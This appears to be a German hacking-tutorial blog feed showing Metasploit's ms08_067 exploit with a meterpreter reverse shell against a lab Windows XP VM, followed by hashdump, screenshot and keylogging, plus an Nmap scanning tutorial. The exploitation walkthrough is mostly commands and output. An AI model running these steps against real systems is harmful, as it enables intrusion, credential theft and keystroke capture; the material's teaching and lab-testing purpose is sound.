<p>2.) Mittels <strong>show options</strong> prüfen wir welche Parameter der neue Payload benötigt. Wie leicht zu erkennen ist benötigt der neue Payload die IP Adresse des Computer von den wir Meterpreter gestartet haben um eine Verbindung aufzubauen.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options

Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   RHOST    192.168.1.110    <span class="nb">yes       </span>The target address
   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>


Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LHOST                      <span class="nb">yes       </span>The listen address
   LPORT     4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic Targeting

</code></pre></div></div>
<h3 id="set-lhost">set LHOST</h3>
<p>3.) Mittels <strong>set LHOST</strong> setzen wir die IP Adresse auf 192.168.1.243</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 192.168.1.243
LHOST <span class="o">=&gt;</span> 192.168.1.243
</code></pre></div></div>

<p>4.) Bevor wir den neuen Exploit starten überpürfen wir noch einmal ob alle einstellungen korrekt gesetzt sind</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:

   Name     Current Setting  Required  Description
   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   RHOST    192.168.1.110    <span class="nb">yes       </span>The target address
   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>


Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LHOST     192.168.1.243    <span class="nb">yes       </span>The listen address
   LPORT     4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic Targeting

</code></pre></div></div>

<h3 id="exploit-meterpreter">exploit meterpreter</h3>
<p>5.) Mit <strong>exploit</strong> starten wir den meterpreter payload.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.1.243:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Automatically detecting the target...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.110:445 - Attempting to trigger the vulnerability...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>179779 bytes<span class="o">)</span> to 192.168.1.110
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 5 opened <span class="o">(</span>192.168.1.243:4444 -&gt; 192.168.1.110:1032<span class="o">)</span> at 2018-01-31 22:30:17 +0100

</code></pre></div></div>
<p>War der Exploit erfolgreich können wir nun einige vorgefertigte Skripts und Befehle verwenden.</p>

<h3 id="hashdump">hashdump</h3>
<p>Auslesen des Windows SAM(Security Account Manager) Datenbank</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run post/windows/gather/hashdump

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Obtaining the boot key...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Calculating the hboot key using SYSKEY 422105af62b50d0000d267d8145cf830...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Obtaining the user list and keys...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decrypting user keys...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping password hints...

No <span class="nb">users </span>with password hints on this system

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping password hashes...


Administrator:500:b34ce522c3e4c87722c34254e51bff62:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9b45eefa50cbd1f779518231c8ae0fb3:8da1ecee0f0c121facdfb869612a33c6:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:60a8616c6fd013a1aff2d7c3328b4af8:::
IEUser:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></pre></div></div>

<h3 id="ps">ps</h3>
<p>Aktuell laufende Prozesse auslesen</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps

Process List
<span class="o">============</span>

 PID   PPID  Name              Arch  Session  User                          Path
 <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>                          <span class="nt">----</span>
 0     0     <span class="o">[</span>System Process]                                               
 4     0     System            x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           
 364   4     smss.exe          x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\S</span>ystemRoot<span class="se">\S</span>ystem32<span class="se">\s</span>mss.exe
 484   604   logon.scr         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>ogon.scr
 580   364   csrss.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>srss.exe
 604   364   winlogon.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe
 648   604   services.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>ervices.exe
 660   604   lsass.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>sass.exe
 820   648   VBoxService.exe   x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\V</span>BoxService.exe
 872   648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 900   648   alg.exe           x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE    C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\a</span>lg.exe
 940   648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1032  648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\s</span>vchost.exe
 1084  648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1120  648   svchost.exe       x86   0        NT AUTHORITY<span class="se">\L</span>OCAL SERVICE    C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
 1164  604   logonui.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>ogonui.exe
 1516  1636  ntvdm.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\n</span>tvdm.exe
 1948  648   spoolsv.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>poolsv.exe

</code></pre></div></div>

<h3 id="screenshot">screenshot</h3>
<p>Erstellen eines Screenshots vom Bildschirm des Zielsystems</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> screenshot
Screenshot saved to: /root/ZxRxRrPE.jpeg
</code></pre></div></div>
<p><img src="/images/posts/metasploit/windows_XP.jpeg" alt="image-center" class="align-center" /></p>

<h3 id="keyscan">keyscan</h3>
<p>Startet die Protokollierung von Tastenbetätigungen auf dem Zielcomputer.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps

Process list
<span class="o">=================</span>

PID Name         Path
<span class="nt">---</span> <span class="nt">----</span>         <span class="nt">----</span>
401 winlogon.exe C:<span class="se">\W</span>INNT<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe

meterpreter <span class="o">&gt;</span> migrate 401

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating to 401...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.

meterpreter <span class="o">&gt;</span> keyscan_start
Starting the keystroke sniffer...

<span class="k">****</span> A few minutes later after an admin logs <span class="k">in</span> <span class="k">****</span>

meterpreter <span class="o">&gt;</span> keyscan_dump
Dumping captured keystrokes...
Administrator ohnoes1vebeenh4x0red!

</code></pre></div></div>

<h2 id="mehr-informationen">Mehr Informationen</h2>

<p>Eine Sammlung der Wichtigsten Metasploit Befehlen<br />
<a href="/docs/metasploit_50">Metasploit Kommandoreferenz</a></p>

<p>Offensive security Tutorial<br />
<a href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a></p>

<p>Offiziele Dokumentation Rapid7
<a href="https://metasploit.help.rapid7.com/docs">https://metasploit.help.rapid7.com/docs</a></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">See you !</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>]]></content><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><summary type="html"><![CDATA[Eine kurze Einführung in das Metasploit Framework]]></summary></entry><entry xml:lang="DE"><title type="html">Nmap</title><link href="https://dg60.github.io/NMAP/" rel="alternate" type="text/html" title="Nmap" /><published>2018-01-03T00:00:00+01:00</published><updated>2018-01-03T00:00:00+01:00</updated><id>https://dg60.github.io/NMAP</id><content type="html" xml:base="https://dg60.github.io/NMAP/"><![CDATA[<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">It´s time to hack</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>Hallo,</p>

<p>Heute möchte ich euch kurz den Netzwerk/Portscanner <a href="https://nmap.org/">Nmap</a> vorstellen. Der mittels CLI Interface oder GUI <a href="https://nmap.org/zenmap/">Zenmap</a> sehr komfortabel gesteuert werden kann. Nmap dient Primär zur Aufklärung und Erkennung von Schwachstellen in einem Netzwerk.</p>

<p><a href="https://de.wikipedia.org/wiki/Portscanner">Grundlagen Portscanning</a></p>

<p><img src="/images/docs/nmap.png" alt="image-center" class="align-center" /></p>

<p><strong>Primäre Aufgaben von Nmap:</strong></p>

<ul>
  <li>Durchführen von Netzwerksscans</li>
  <li>Prüfen welche Ports am Zielsystem geöffnet sind</li>
  <li>Erkennug der Dienste die hinter den offenen Ports laufen</li>
  <li>Schwachstellenerkennung mittels <a href="https://nmap.org/book/nse-usage.html">NSE</a> skripten</li>
  <li>uvm.</li>
</ul>

<h2 id="installation">Installation</h2>

<p>Der einfachste weg ist es die Kali Linux Distribution von <a href="https://www.kali.org/">Kali.org</a> herunter zu laden. Die Distribution gibt es als live Image oder als Abild einer Virtuelle Maschine für die Hypervisoren Vmware Player/Virtual Box auf der Seite von <a href="https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/">Offense Security</a>.</p>

<p>Es ist jedoch auch ohne weiteres möglich Nmap wie jedes andere Programm zu installieren. <a href="https://nmap.org/download.html">Nmap</a> stellt die Binaries für alle gängigen Betriebssysteme(Linux, MacOS, Windows) zur verfügung.</p>

<p class="notice--danger"><strong>Bitte führen sie keine Netzwerk oder Portscan in fremden Netzwerken oder in deren sie nicht berechtigt sind.</strong></p>

<h2 id="grundlegende-port-scanning-methoden">Grundlegende Port-Scanning Methoden</h2>

<ul>
  <li>
    <p>-sS <strong>TCP-SYN-Scan</strong>
Der SYN-Scan ist aus gutem Grund die Standardeinstellung und die beliebteste Scan-Methode. Er kann schnell durchgeführt werden und scannt dabei Tausende von Ports pro Sekunde, wenn das Netzwerk schnell ist und nicht von einer intrusiven Firewall behindert wird. Der SYN-Scan ist relativ unauffällig, da er TCP-Verbindungen niemals abschließt. Außerdem funktioniert er auch bei allen konformen TCP-Stacks und ist unabhängig von spezifischen Eigenarten von Plattformen, wie es bei den FIN-/NULL-/Xmas-, Maimon- und Idle-Scans in Nmap der Fall ist. Er erlaubt auch eine klare, zuverlässige Unterscheidung zwischen den Zuständen offen, geschlossen und gefiltert. Diese Methode wird oft als halboffenes Scannen bezeichnet, weil keine vollständige TCP-Verbindung hergestellt wird. Sie senden ein SYN-Paket, als ob Sie eine echte Verbindung herstellen würden, und warten dann auf eine Antwort. Ein SYN/ACK zeigt, dass jemand auf dem Port lauscht (dass er offen ist), während ein RST (Reset) anzeigt, dass niemand darauf lauscht. Falls nach mehreren erneuten Übertragungen keine Antwort erhalten wird, wird der Port als gefiltert markiert. Der Port wird auch dann als gefiltert markiert, wenn ein ICMP Unreachable-Fehler (Typ 3, Code 1, 2, 3, 9, 10 oder 13) empfangen wird.</p>
  </li>
  <li>
    <p>-sT  <strong>TCP-Connect-Scan</strong> 
Der TCP-Connect-Scan ist der standardmäßig eingestellte TCP-Scan-Typ, falls der SYN-Scan(-sS) nicht möglich ist. Das ist dann der Fall, wenn der Benutzer kein Recht hat, rohe Pakete zu senden, oder wenn er IPv6-Netzwerke scannt. Statt rohe Pakete zu schreiben, wie es die meisten anderen Scan-Typen machen, bittet Nmap das darunterliegende Betriebssystem, eine Verbindung mit dem Zielrechner und -port herzustellen, indem es einen Systemaufruf namens connect benutzt. Das ist derselbe Systemaufruf auf höherer Ebene, den Webbrowser, P2P-Clients und die meisten anderen netzwerkfähigen Anwendungen benutzen, um eine Verbindung herzustellen. Er ist Teil einer Programmierschnittstelle, die unter dem Namen Berkeley Sockets-API bekannt ist. Statt Antworten in Form roher Pakete von der Leitung zu lesen, benutzt Nmap diese API, um zu jedem Verbindungsversuch eine Statusinformation zu erhalten. Wenn der SYN-Scan verfügbar ist, ist er normalerweise die bessere Wahl. Nmap hat weniger Einfluss auf den connect-Systemaufruf als auf rohe Pakete, wodurch es weniger effizient wird. Der Systemaufruf beendet Verbindungen zu offenen Ziel-Ports vollständig, statt sie in halboffenen Zustand zurückzusetzen, wie es der SYN-Scan macht. Das dauert nicht nur länger und erfordert mehr Pakete, um an dieselbe Information zu gelangen, sondern es ist sehr viel wahrscheinlicher, dass die Zielrechner die Verbindung protokollieren.</p>
  </li>
</ul>

<p><strong>Standardports und die dahinter stehenden Dienste:</strong></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Portnummer</th>
      <th style="text-align: left">Service</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">20</td>
      <td style="text-align: left">FTP-Datenübertragung</td>
    </tr>
    <tr>
      <td style="text-align: left">22</td>
      <td style="text-align: left">FTP-Steuerung</td>
    </tr>
    <tr>
      <td style="text-align: left">22</td>
      <td style="text-align: left">SSH</td>
    </tr>
    <tr>
      <td style="text-align: left">23</td>
      <td style="text-align: left">Telnet</td>
    </tr>
    <tr>
      <td style="text-align: left">25</td>
      <td style="text-align: left">SMTP (Email)</td>
    </tr>
    <tr>
      <td style="text-align: left">53</td>
      <td style="text-align: left">DNS</td>
    </tr>
    <tr>
      <td style="text-align: left">80</td>
      <td style="text-align: left">HTTP</td>
    </tr>
    <tr>
      <td style="text-align: left">137-139</td>
      <td style="text-align: left">NetBIOS</td>
    </tr>
    <tr>
      <td style="text-align: left">443</td>
      <td style="text-align: left">HTTPS</td>
    </tr>
    <tr>
      <td style="text-align: left">445</td>
      <td style="text-align: left">SMB</td>
    </tr>
    <tr>
      <td style="text-align: left">1433</td>
      <td style="text-align: left">MSSQL</td>
    </tr>
    <tr>
      <td style="text-align: left">3306</td>
      <td style="text-align: left">MySQL</td>
    </tr>
    <tr>
      <td style="text-align: left">3389</td>
      <td style="text-align: left">RDP</td>
    </tr>
    <tr>
      <td style="text-align: left">5800</td>
      <td style="text-align: left">VNC über HTTP</td>
    </tr>
    <tr>
      <td style="text-align: left">5900</td>
      <td style="text-align: left">VNC</td>
    </tr>
  </tbody>
</table>

<h2 id="basis-scan-via-cli">Basis Scan via CLI</h2>

<p>Im folgenden Beispiel scannen wir einen Netzwerkteilnehmer mit der Adresse 192.168.1.100 und verwenden dabei die TCP-SYN-Scan Methode. In meinem Netzwerk ist unter dieser Adresse meine Heizungssteuerung (Möhlenhoff Alpha) zu erreichen. Da die TCP-SYN Scan Methode Root bzw. Admin Rechte erfordert muss dem befehl bei Debian Distributionen ein “sudo” vorangestellt um den Befehl erfolgreich auszuführen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-Pn</span> 192.168.1.100  
</code></pre></div></div>
<p>Wurde der Scan erfolgreich abgeschlossen sollten wir eine Ausgabe mit den offenen Ports erhalten und auch welche Service sich dahinter verbirgt</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>192.168.1.100
Host is up <span class="o">(</span>0.0033s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 38:DE:60:01:xx:xx <span class="o">(</span>Mohlenhoff GmbH<span class="o">)</span>
</code></pre></div></div>
<p>Da aber nicht immer Root bzw. Admin Rechte vorhanden sind, kann auch ein TCP-Connect-Scan durchgeführt werden.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> 192.168.1.100
</code></pre></div></div>

<p>Wie erhalten die selbe Ausgabe wir zuvor. Jedoch wird der durchgeführte mit sehr hoher Wahrscheinlichkeit in einer Log-Datei mitprotokolliert. Daher sollte der TCP-SYN-Scan dieser Methode immer vorgezogen werden.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>192.168.1.100
Host is up <span class="o">(</span>0.0070s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.45 seconds
</code></pre></div></div>
<p>Um eine gesamtes Subnet zur scannen können folgende Befehle verwendet werden. Bitte beachtet das der scan eines kompletten Subnets bis zu 15 Minuten dauern kann.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-Pn</span> 192.168.1.1-254
<span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-Pn</span> 192.168.1.1/24
</code></pre></div></div>

<p>Hier sehen wir kleinen Auszug den ich von Scan meines Netzwerk erhalte:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>router.asus.com <span class="o">(</span>192.168.x.x<span class="o">)</span>
Host is up <span class="o">(</span>0.00049s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 925 closed ports, 70 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
515/tcp  open  printer
8443/tcp open  https-alt
9100/tcp open  jetdirect
MAC Address: BC:EE:7B:8E:xx:xx <span class="o">(</span>Asustek Computer<span class="o">)</span>

Nmap scan report <span class="k">for </span>android-xxxxx <span class="o">(</span>192.168.1.xx<span class="o">)</span>
Host is up <span class="o">(</span>0.062s latency<span class="o">)</span><span class="nb">.</span>
All 1000 scanned ports on android-xxxxxx <span class="o">(</span>192.168.1.xx<span class="o">)</span> are closed
MAC Address: C4:43:8F:AF:xx:xx <span class="o">(</span>xx Electronics<span class="o">)</span>

Nmap scan report <span class="k">for </span>192.168.1.100
Host is up <span class="o">(</span>0.0035s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 38:DE:60:01:xx:xx <span class="o">(</span>Mohlenhoff GmbH<span class="o">)</span>

...

Nmap <span class="k">done</span>: 254 IP addresses <span class="o">(</span>8 hosts up<span class="o">)</span> scanned <span class="k">in </span>969.88 seconds
</code></pre></div></div>

<p>Um die durchgeführten Scans zu dokumentieren empfiehlt es das Ergebnis in eine Datei umzuleiten.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> 192.168.1.100 <span class="o">&gt;</span> scan.txt
</code></pre></div></div>
<p>Oder man nutzt die bereits in Nmap integrierten flags um die Ergebnise formatiert in eine Datei auszugeben und zu speichern.</p>

<p><a href="https://nmap.org/book/output-formats-commandline-flags.html#output-formats-flags-type">Nmap Output Flags</a></p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Output flag</th>
      <th style="text-align: left">Beschreibung</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-oN</td>
      <td style="text-align: left">Normale Ausgabe in eine Datei</td>
    </tr>
    <tr>
      <td style="text-align: left">-oX</td>
      <td style="text-align: left">XML Ausgabe in eine Datei</td>
    </tr>
    <tr>
      <td style="text-align: left">-oS</td>
      <td style="text-align: left">ScRipT KIddi 3-Ausgabe</td>
    </tr>
    <tr>
      <td style="text-align: left">-oG</td>
      <td style="text-align: left">grepbare Ausgabe</td>
    </tr>
    <tr>
      <td style="text-align: left">-oA</td>
      <td style="text-align: left">Ausgabe in allen Formaten</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> 192.168.1.100 
<span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> 192.168.1.100 
<span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oS</span> 192.168.1.100 
<span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> 192.168.1.100 
<span class="nv">$ </span>nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> 192.168.1.100 
</code></pre></div></div>

<h2 id="nse-schwachstellen-scan">NSE Schwachstellen Scan</h2>

<p>Nun wollen wir einen Teilnehmer im Netzwerk auf bekannte Schwachstellen prüfen. Den dafür stellt die <a href="https://nmap.org/nsedoc/categories/default.html">NSE Nmap Script Engine</a> einige Standard Skripte zur Verfügung. Der Übersichtlichkeit halber sind die NSE-Skripte in Kategorien eingeteilt. Zurzeit gibt es die Kategorien auth , broadcast , brute , default , discovery ,
dos , exploit , external , fuzzer , intrusive , malware , safe , version und
vuln.</p>

<p class="notice--info"><strong>Information<br />
Die NSE und ihre Skripts sind in Nmap eingebaut. Sie müssen daher
nichts zusätzlich installieren oder konfigurieren.</strong></p>

<p>Will man nur ein bestimmtes script ausführen gibt man einfach den Namen des auszuführenden Skriptes an. Zum Beispiel:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-script</span> smb-vuln-ms08-067 192.168.1.110
</code></pre></div></div>

<p>Mit den flags “–script vuln” werden alle Skripte in der Kategorie vuln ausgeführt.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--script</span> vuln 192.168.1.100
</code></pre></div></div>

<p>Ausgabe des Scan aus der Kategorie vuln:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     192.168.1.236
|     192.168.1.1
|     192.168.1.131
|   After NULL UDP avahi packet DoS <span class="o">(</span>CVE-2011-1002<span class="o">)</span><span class="nb">.</span>
|_  Hosts are all up <span class="o">(</span>not vulnerable<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>192.168.1.100
Host is up <span class="o">(</span>0.0066s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
|_http-cross-domain-policy: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_http-csrf: Couldn t find any CSRF vulnerabilities
|_http-dombased-xss: Couldn t find any DOM based XSS.
|_http-fileupload-exploiter: 
|_http-frontpage-login: <span class="nb">false</span>
|_http-stored-xss: Couldn t find any stored XSS vulnerabilities.
|_http-vuln-wnr1000-creds: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
8080/tcp open  http-proxy
|_http-cross-domain-policy: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_http-frontpage-login: <span class="nb">false</span>
|_http-vuln-wnr1000-creds: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>53.34 seconds

</code></pre></div></div>
<p>Wie man hier schön sehen kann ist meine Heizungssteurung nicht angreifbar, sie ist nur anfällig für einen Denial of Service(Dos) Angriff <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002">CVE-2011-1002</a>.</p>

<p>Um euch jedoch zu zeigen welche Ausgabe wir erhalten wenn wir einen Host scannen der Sicherheitslücken aufweist, seht ihr in der Ausgabe einen Scan von einer Virtuellen Windows XP Maschine SP1. Diese VM Maschine weist einige Sicherheitslücken auf und mit diesen wissen kann man sich in der Metasploit Datenbank auf die Suche nach einen geeigneten Exploits (<a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi">Metasploit ms08-067</a>) machen. <a href="https://www.metasploit.com/">Metasploit</a> werd ich euch in einem meiner nächsten Artikel vorstellen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>ie6winxp <span class="o">(</span>192.168.x.x<span class="o">)</span>
Host is up <span class="o">(</span>0.0065s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
|_ssl-ccs-injection: No reply from server <span class="o">(</span>TIMEOUT<span class="o">)</span>

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit <span class="o">(</span>CVE-2009-3103, Microsoft Security Advisory 975497<span class="o">)</span>
